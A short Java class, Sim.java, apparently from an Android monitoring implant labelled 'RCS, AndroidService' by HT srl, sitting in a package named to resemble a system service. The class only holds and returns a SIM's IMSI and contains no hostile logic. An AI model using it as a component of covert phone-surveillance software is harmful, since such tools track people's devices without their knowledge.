/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Sim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service;

public class Sim {
	private String imsi;
	
	public Sim(String imsi) {
		this.imsi = imsi;
	}
	
	public String getImsi() {
		return imsi;
	}
}
